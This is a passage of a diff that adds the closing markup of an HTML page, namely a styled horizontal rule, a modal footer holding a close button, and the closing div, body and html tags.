+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+</body>
+</html>
